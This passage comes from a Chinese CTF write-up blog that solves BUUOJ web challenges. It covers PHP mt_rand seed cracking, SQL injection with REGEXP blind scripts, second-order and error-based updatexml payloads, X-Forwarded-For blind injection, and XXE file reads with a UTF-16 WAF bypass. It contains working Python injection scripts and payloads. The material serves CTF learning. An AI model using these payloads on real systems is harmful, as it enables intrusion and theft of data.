2019]枯燥的抽奖"></a>[GWCTF 2019]枯燥的抽奖</h3><p>抽奖程序，给了一部分私钥，查看网页源码，找到了check.php，访问页面，给了源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">5</span>OK7HlAYF4</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">#这不是抽奖程序的源代码！不许看！</span></span><br><span class="line">header(<span class="string">"Content-Type: text/html;charset=utf-8"</span>);</span><br><span class="line">session_start();</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>($_SESSION[<span class="string">'seed'</span>]))&#123;</span><br><span class="line">$_SESSION[<span class="string">'seed'</span>]=rand(<span class="number">0</span>,<span class="number">999999999</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">mt_srand($_SESSION[<span class="string">'seed'</span>]);</span><br><span class="line">$str_long1 = <span class="string">"abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ"</span>;</span><br><span class="line">$str=<span class="string">''</span>;</span><br><span class="line">$len1=<span class="number">20</span>;</span><br><span class="line"><span class="keyword">for</span> ( $i = <span class="number">0</span>; $i &lt; $len1; $i++ )&#123;</span><br><span class="line">    $str.=substr($str_long1, mt_rand(<span class="number">0</span>, strlen($str_long1) - <span class="number">1</span>), <span class="number">1</span>);       </span><br><span class="line">&#125;</span><br><span class="line">$str_show = substr($str, <span class="number">0</span>, <span class="number">10</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;p id='p1'&gt;"</span>.$str_show.<span class="string">"&lt;/p&gt;"</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'num'</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span>($_POST[<span class="string">'num'</span>]===$str)&#123;x</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&lt;p id=flag&gt;抽奖，就是那么枯燥且无味，给你flag&#123;xxxxxxxxx&#125;&lt;/p&gt;"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&lt;p id=flag&gt;没抽中哦，再试试吧&lt;/p&gt;"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">show_source(<span class="string">"check.php"</span>);</span><br></pre></td></tr></table></figure><p>又是一道用mt_srand随机分发种子的题目，根据[MRCTF2020]Ezaudit的经验，应该又是要用php_mt_sand工具进行破解，先将5OK7HlAYF4转换成工具能够跑的数据，这里就不贴转换脚本了，上面有。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">31 31 0 61 50 50 0 61 46 46 0 61 33 33 0 61 43 43 0 61 11 11 0 61 36 36 0 61 60 60 0 61 41 41 0 61 30 30 0 61</span><br></pre></td></tr></table></figure><img src="/2020/06/04/buuoj5/10.png" class=""><p>可以看到是php7.1.0以上版本的，用php7.1.0以上的版本来跑出私钥</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">mt_srand(<span class="number">31829466</span>);</span><br><span class="line">$str_long1 = <span class="string">"abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ"</span>;</span><br><span class="line">$str=<span class="string">''</span>;</span><br><span class="line">$len1=<span class="number">20</span>;</span><br><span class="line"><span class="keyword">for</span> ( $i = <span class="number">0</span>; $i &lt; $len1; $i++ )&#123;</span><br><span class="line">    $str.=substr($str_long1, mt_rand(<span class="number">0</span>, strlen($str_long1) - <span class="number">1</span>), <span class="number">1</span>);       </span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> $str;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><img src="/2020/06/04/buuoj5/11.png" class=""><p>与前面给的部分完美匹配上了</p><img src="/2020/06/04/buuoj5/12.png" class=""><h3 id="NCTF2019-SQLi"><a href="#NCTF2019-SQLi" class="headerlink" title="[NCTF2019]SQLi"></a>[NCTF2019]SQLi</h3><p>题目一看就知道是sql注入，随手试一下万能密钥，弹窗hacker</p><p>目录扫描，发现有robots.txt，访问给了hint.txt</p><img src="/2020/06/04/buuoj5/13.png" class=""><p>可以发现时间盲注和布尔盲注用到的函数基本都被过滤了，但还有一个regexp，这里还要用注释绕过，直接上脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> requests <span class="keyword">as</span> req</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ord2hex</span><span class="params">(string)</span>:</span></span><br><span class="line">    result = <span class="string">''</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> string:</span><br><span class="line">        result += hex(ord(i))</span><br><span class="line"></span><br><span class="line">    result = result.replace(<span class="string">'0x'</span>, <span class="string">''</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">'0x'</span> + result</span><br><span class="line">url = <span class="string">"http://63d4e709-46a6-462c-b28a-07eed7cc3219.node3.buuoj.cn/"</span></span><br><span class="line">string = [ord(i) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="string">'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_/!|'</span>]</span><br><span class="line"><span class="comment"># print(string)</span></span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">'User-Agent'</span>: <span class="string">'Mozilla/5.0 (Windows NT 6.2; rv:16.0) Gecko/20100101 Firefox/16.0'</span>,</span><br><span class="line">    <span class="string">'Accept'</span>: <span class="string">'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'</span>,</span><br><span class="line">    <span class="string">'Connection'</span>: <span class="string">'keep-alive'</span></span><br><span class="line">&#125;</span><br><span class="line">res = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">50</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> string:</span><br><span class="line">        passwd = ord2hex(<span class="string">'^'</span> + res + chr(j))</span><br><span class="line">        <span class="comment"># print(passwd)</span></span><br><span class="line">        passwd = <span class="string">'||passwd/**/REGEXP/**/&#123;&#125;;\x00'</span>.format(passwd)</span><br><span class="line">        print(passwd)</span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">'username'</span>: <span class="string">"\\"</span>,</span><br><span class="line">            <span class="string">'passwd'</span>: passwd</span><br><span class="line">        &#125;</span><br><span class="line">        r = req.post(url, data=data, headers=headers, allow_redirects=<span class="literal">False</span>)</span><br><span class="line">        <span class="keyword">if</span> r.status_code == <span class="number">302</span>:</span><br><span class="line">            res += chr(j)</span><br><span class="line">            print(res)</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure><img src="/2020/06/04/buuoj5/14.png" class=""><p>跑出了登录密码，账号随便填，源码验证那块只要求passwd是和admin的passwd相等就可以了</p><p>登录拿到flag</p>]]></content>
      
      
      
        <tags>
            
            <tag> buu </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>xxeChallenge</title>
      <link href="/2020/06/02/xxeChallenge/"/>
      <url>/2020/06/02/xxeChallenge/</url>
      
        <content type="html"><![CDATA[<p>前述：xxe国内题目较少，总结在一起，方便回顾<a id="more"></a></p><h3 id="NCTF2019-True-XML-cookbook"><a href="#NCTF2019-True-XML-cookbook" class="headerlink" title="[NCTF2019]True XML cookbook"></a>[NCTF2019]True XML cookbook</h3><p>开题是个登录框，题目说了是xml的题，直接想到xxe，不用尝试sql注入了</p><p>用burp抓包登录，可以看到抓到的数据就是xxe的格式，尝试外部实体注入读取/etc/passwd，成功,没啥东西，来看看/etc/hosts,发现存活主机</p><img src="/2020/06/02/xxeChallenge/1.png" class=""><p>那就直接http访问主机，结果如下</p><img src="/2020/06/02/xxeChallenge/2.png" class=""><p>报错了，那就是没有这台主机，其他师傅说这是要打内网的主机，需要跑脚本，但是这题好像后一个地址就是了，那就试试</p><img src="/2020/06/02/xxeChallenge/3.png" class=""><p>可以看到读到了flag，这里内网主机可以用burp爆破，脚本暂时没找到</p><h3 id="CSAWQual-2019-Web-Unagi"><a href="#CSAWQual-2019-Web-Unagi" class="headerlink" title="[CSAWQual 2019]Web_Unagi"></a>[CSAWQual 2019]Web_Unagi</h3><p>文件上传，在about处得知flag在根目录下，在upload处有个提示，是xml的格式</p><img src="/2020/06/02/xxeChallenge/4.png" class=""><p>看到这个，应该就是上传一个xml 的文件来打了</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0"?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">users</span> [<span class="meta">&lt;!ENTITY <span class="meta-keyword">xxe</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">"file:///flag"</span>&gt;</span>  ]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">users</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">user</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">username</span>&gt;</span>alice<span class="tag">&lt;/<span class="name">username</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">password</span>&gt;</span>passwd1<span class="tag">&lt;/<span class="name">password</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">name</span>&gt;</span>Alice<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">email</span>&gt;</span>alice@fakesite.com<span class="tag">&lt;/<span class="name">email</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">group</span>&gt;</span>CSAW2019<span class="tag">&lt;/<span class="name">group</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">intro</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">intro</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">user</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">users</span>&gt;</span></span><br></pre></td></tr></table></figure><p>写一个文件，users字段直接用网页给的信息就行，直接上传，发现过不了，有WAF，找到了一篇xxe绕WAF的文章<a href="https://xz.aliyun.com/t/4059#toc-4，里面提到可以用编码进行绕过" target="_blank" rel="noopener">https://xz.aliyun.com/t/4059#toc-4，里面提到可以用编码进行绕过</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">一个xml文档不仅可以用UTF-8编码，也可以用UTF-16(两个变体 - BE和LE)、UTF-32(四个变体 - BE、LE、2143、3412)和EBCDIC编码。</span><br><span class="line">在这种编码的帮助下，使用正则表达式可以很容易地绕过WAF，因为在这种类型的WAF中，正则表达式通常仅配置为单字符集。</span><br></pre></td></tr></table></figure><p>查一下linux的编码转换命令(GBK-&gt;UTF-8）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">iconv -f GBK -t UTF-8 file1 -o file2</span><br></pre></td></tr></table></figure><p>改一下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">iconv -f utf-8 -t utf-16 file1&gt;file2</span><br></pre></td></tr></table></figure><p>将转换完的文件上传</p><img src="/2020/06/02/xxeChallenge/5.png" class="">]]></content>
      
      
      
        <tags>
            
            <tag> buu </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SQLChallenge</title>
      <link href="/2020/05/30/SQLChallenge/"/>
      <url>/2020/05/30/SQLChallenge/</url>
      
        <content type="html"><![CDATA[<p>SQL注入题型很多，方法还是那一些，就把SQL注入题放一起，方便复习回顾<a id="more"></a></p><h3 id="CISCN2019-华北赛区-Day1-Web5-CyberPunk"><a href="#CISCN2019-华北赛区-Day1-Web5-CyberPunk" class="headerlink" title="[CISCN2019 华北赛区 Day1 Web5]CyberPunk"></a>[CISCN2019 华北赛区 Day1 Web5]CyberPunk</h3><p>打开页面是一个订单提交的页面，看一下网页源码找到了提示，应该是用filter://来读取源码</p><p>依次读取config.php,delete.php,change.php,confirm.php,base64解码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#confirm.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">require_once</span> <span class="string">"config.php"</span>;</span><br><span class="line"><span class="comment">//var_dump($_POST);</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">empty</span>($_POST[<span class="string">"user_name"</span>]) &amp;&amp; !<span class="keyword">empty</span>($_POST[<span class="string">"address"</span>]) &amp;&amp; !<span class="keyword">empty</span>($_POST[<span class="string">"phone"</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    $msg = <span class="string">''</span>;</span><br><span class="line">    $pattern = <span class="string">'/select|insert|update|delete|and|or|join|like|regexp|where|union|into|load_file|outfile/i'</span>;</span><br><span class="line">    $user_name = $_POST[<span class="string">"user_name"</span>];</span><br><span class="line">    $address = $_POST[<span class="string">"address"</span>];</span><br><span class="line">    $phone = $_POST[<span class="string">"phone"</span>];</span><br><span class="line">    <span class="keyword">if</span> (preg_match($pattern,$user_name) || preg_match($pattern,$phone))&#123;</span><br><span class="line">        $msg = <span class="string">'no sql inject!'</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        $sql = <span class="string">"select * from `user` where `user_name`='&#123;$user_name&#125;' and `phone`='&#123;$phone&#125;'"</span>;</span><br><span class="line">        $fetch = $db-&gt;query($sql);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>($fetch-&gt;num_rows&gt;<span class="number">0</span>) &#123;</span><br><span class="line">        $msg = $user_name.<span class="string">"å·²æäº¤è®¢å"</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        $sql = <span class="string">"insert into `user` ( `user_name`, `address`, `phone`) values( ?, ?, ?)"</span>;</span><br><span class="line">        $re = $db-&gt;prepare($sql);</span><br><span class="line">        $re-&gt;bind_param(<span class="string">"sss"</span>, $user_name, $address, $phone);</span><br><span class="line">        $re = $re-&gt;execute();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#search.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">require_once</span> <span class="string">"config.php"</span>; </span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">empty</span>($_POST[<span class="string">"user_name"</span>]) &amp;&amp; !<span class="keyword">empty</span>($_POST[<span class="string">"phone"</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    $msg = <span class="string">''</span>;</span><br><span class="line">    $pattern = <span class="string">'/select|insert|update|delete|and|or|join|like|regexp|where|union|into|load_file|outfile/i'</span>;</span><br><span class="line">    $user_name = $_POST[<span class="string">"user_name"</span>];</span><br><span class="line">    $phone = $_POST[<span class="string">"phone"</span>];</span><br><span class="line">    <span class="keyword">if</span> (preg_match($pattern,$user_name) || preg_match($pattern,$phone))&#123; </span><br><span class="line">        $msg = <span class="string">'no sql inject!'</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        $sql = <span class="string">"select * from `user` where `user_name`='&#123;$user_name&#125;' and `phone`='&#123;$phone&#125;'"</span>;</span><br><span class="line">        $fetch = $db-&gt;query($sql);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>($fetch) &amp;&amp; $fetch-&gt;num_rows&gt;<span class="number">0</span>)&#123;</span><br><span class="line">        $row = $fetch-&gt;fetch_assoc();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#change.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">require_once</span> <span class="string">"config.php"</span>;</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">empty</span>($_POST[<span class="string">"user_name"</span>]) &amp;&amp; !<span class="keyword">empty</span>($_POST[<span class="string">"address"</span>]) &amp;&amp; !<span class="keyword">empty</span>($_POST[<span class="string">"phone"</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    $msg = <span class="string">''</span>;</span><br><span class="line">    $pattern = <span class="string">'/select|insert|update|delete|and|or|join|like|regexp|where|union|into|load_file|outfile/i'</span>;</span><br><span class="line">    $user_name = $_POST[<span class="string">"user_name"</span>];</span><br><span class="line">    $address = addslashes($_POST[<span class="string">"address"</span>]);</span><br><span class="line">    $phone = $_POST[<span class="string">"phone"</span>];</span><br><span class="line">    <span class="keyword">if</span> (preg_match($pattern,$user_name) || preg_match($pattern,$phone))&#123;</span><br><span class="line">        $msg = <span class="string">'no sql inject!'</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        $sql = <span class="string">"select * from `user` where `user_name`='&#123;$user_name&#125;' and `phone`='&#123;$phone&#125;'"</span>;</span><br><span class="line">        $fetch = $db-&gt;query($sql);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>($fetch) &amp;&amp; $fetch-&gt;num_rows&gt;<span class="number">0</span>)&#123;</span><br><span class="line">        $row = $fetch-&gt;fetch_assoc();</span><br><span class="line">        $sql = <span class="string">"update `user` set `address`='"</span>.$address.<span class="string">"', `old_address`='"</span>.$row[<span class="string">'address'</span>].<span class="string">"' where `user_id`="</span>.$row[<span class="string">'user_id'</span>];</span><br><span class="line">        $result = $db-&gt;query($sql);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>这里可以看到user_name和phone都经过了严格的过滤，只有address可能可以注入</p><p>这里注意到address经过addslashes函数转义不会造成注入，但是会跟着user_name和phone存入数据库，在存入mysql数据库的时候转义的字符会被去掉，也就是说数据又恢复到输入的时候，这就可以利用二次注入了</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$sql = "<span class="keyword">update</span> <span class="string">`user`</span> <span class="keyword">set</span> <span class="string">`address`</span>=<span class="string">'".$address."'</span>, <span class="string">`old_address`</span>=<span class="string">'".$row['</span>address<span class="string">']."'</span> <span class="keyword">where</span> <span class="string">`user_id`</span>=<span class="string">".$row['user_id'];</span></span><br></pre></td></tr></table></figure><p>更改地址信息时会报sql语句的错，这里就可以用报错注入的方法</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1' where user_id=updatexml(1,concat(0x7e,(<span class="keyword">select</span> <span class="keyword">substr</span>(<span class="keyword">load_file</span>(<span class="string">'/flag.txt'</span>),<span class="number">1</span>,<span class="number">30</span>)),<span class="number">0x7e</span>),<span class="number">1</span>)<span class="comment">#</span></span><br><span class="line"></span><br><span class="line"><span class="number">1</span><span class="string">' where user_id=updatexml(1,concat(0x7e,(select substr(load_file('</span>/flag.txt<span class="string">'),31,60)),0x7e),1)#</span></span><br></pre></td></tr></table></figure><p>首先在页面创建地址为上述语句的订单，在修改地址页面再次输入就可报错回显部分flag，前后两次flag拼接即可</p><h3 id="RoarCTF-2019-Online-Proxy"><a href="#RoarCTF-2019-Online-Proxy" class="headerlink" title="[RoarCTF 2019]Online Proxy"></a>[RoarCTF 2019]Online Proxy</h3><img src="/2020/05/30/SQLChallenge/1.png" class=""><p>用burp抓包看到一个client-ip,猜测可以用X-Forwarded-For,果然，数据会先写到数据库中，第二次写入时会拿出上次写入的内容，可以用盲注进行注入</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#Author peguin</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">"http://node3.buuoj.cn:27656/"</span></span><br><span class="line">head = &#123;</span><br><span class="line">    <span class="string">"Cookie"</span>:<span class="string">"track_uuid=5d7911a1-6ee7-4468-a15e-4ca7b34ad643"</span>,</span><br><span class="line">    <span class="string">"User-Agent"</span>:<span class="string">"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:76.0) Gecko/20100101 Firefox/76.0"</span>,</span><br><span class="line">    <span class="string">'Accept'</span>: <span class="string">'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8'</span>,</span><br><span class="line">    <span class="string">'X-Forwarded-For'</span>:<span class="string">""</span></span><br><span class="line">&#125;</span><br><span class="line">res = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">100</span>):</span><br><span class="line">    low = <span class="number">32</span></span><br><span class="line">    high = <span class="number">127</span></span><br><span class="line">    mid = (low+high)//<span class="number">2</span></span><br><span class="line">    <span class="keyword">while</span> low&lt;high:</span><br><span class="line">        <span class="comment"># payload = "0' or ascii(substr((select(group_concat(schema_name))from(information_schema.schemata)),&#123;&#125;,1))&gt;&#123;&#125; or '0".format(i,mid)//information_schema,ctftraining,mysql,performance_schema,test,ctf,F4l9_D4t4B45e</span></span><br><span class="line">        <span class="comment"># payload = "0' or ascii(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema='F4l9_D4t4B45e')),&#123;&#125;,1))&gt;&#123;&#125; or '0".format(i,mid)//F4l9_t4b1e</span></span><br><span class="line">        <span class="comment"># payload = "0' or ascii(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name='F4l9_t4b1e')),&#123;&#125;,1))&gt;&#123;&#125; or '0".format(i, mid)//F4l9_C01uMn</span></span><br><span class="line">        payload = <span class="string">"0' or ascii(substr((select(group_concat(F4l9_C01uMn))from(F4l9_D4t4B45e.F4l9_t4b1e)),&#123;&#125;,1))&gt;&#123;&#125; or '0"</span>.format(i, mid)</span><br><span class="line">        head[<span class="string">'X-Forwarded-For'</span>] = payload</span><br><span class="line">        r = requests.post(url=url, headers=head)</span><br><span class="line">        head[<span class="string">'X-Forwarded-For'</span>] = <span class="string">"penson"</span></span><br><span class="line">        r = requests.post(url=url, headers=head)</span><br><span class="line">        r = requests.post(url=url, headers=head)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">"Last Ip: 1 "</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            low = mid + <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            high = mid</span><br><span class="line">        mid = (low + high) // <span class="number">2</span></span><br><span class="line">    <span class="keyword">if</span> mid == <span class="number">31</span> <span class="keyword">or</span> mid == <span class="number">127</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    res += chr(mid)</span><br><span class="line">    print(res)</span><br><span class="line">print(res)</span><br></pre></td></tr></table></figure><p>这里要注意必须传入cookie，F12可以找到cookie</p><h3 id="RCTF2015-EasySQL"><a href="#RCTF2015-EasySQL" class="headerlink" title="[RCTF2015]EasySQL"></a>[RCTF2015]EasySQL</h3><p>开题，有一个注册和登录，题目提示SQL，那么试试or、and之类的注册，发现被过滤了，fuzz一下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">@</span><br><span class="line">or</span><br><span class="line">and</span><br><span class="line">space（空格）</span><br><span class="line">substr</span><br><span class="line">mid</span><br><span class="line">left</span><br><span class="line">right</span><br><span class="line">handle</span><br><span class="line">.........</span><br></pre></td></tr></table></figure><p>注册用户名为admin”的用户，登录发现有修改密码，根据前面题目的经验应该又是一道二次注入题，来试试</p><img src="/2020/05/30/SQLChallenge/2.png" class=""><p>发现在修改密码是会报错，那么可以用报错注入的方式来做</p><p>payload：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">admin"^updatexml(1,concat(0x7e,(<span class="keyword">select</span>(<span class="keyword">group_concat</span>(table_name))<span class="keyword">from</span>(information_schema.tables)<span class="keyword">where</span>(table_schema=<span class="keyword">database</span>()))),<span class="number">1</span>)<span class="comment">#</span></span><br><span class="line">//XPATH syntax <span class="keyword">error</span>: <span class="string">'~article,flag,users'</span></span><br></pre></td></tr></table></figure><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">admin"^updatexml(1,concat(0x7e,(<span class="keyword">select</span>(<span class="keyword">group_concat</span>(column_name))<span class="keyword">from</span>(information_schema.columns)<span class="keyword">where</span>(table_name=<span class="string">'flag'</span>))),<span class="number">1</span>)<span class="comment">#</span></span><br><span class="line">//XPATH syntax <span class="keyword">error</span>: <span class="string">'~flag'</span></span><br></pre></td></tr></table></figure><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">admin"^updatexml(1,concat(0x7e,(<span class="keyword">select</span>(<span class="keyword">group_concat</span>(flag))<span class="keyword">from</span>(flag))),<span 